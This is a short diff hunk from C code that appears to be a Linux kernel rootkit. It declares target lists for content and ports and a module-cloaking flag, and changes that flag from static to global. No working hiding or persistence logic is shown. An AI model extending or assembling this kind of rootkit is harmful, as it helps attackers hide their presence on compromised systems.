@@ -61,7 +61,7 @@ struct rk_target_list content_targets;
 struct rk_target_list port_targets;
 static struct proc_dir_entry *proc_entry;
 static struct list_head *saved_prev;
-static bool cloaked;
+bool cloaked;
 static bool persist_requested;
 
 /* --- module cloaking (M01) --- */
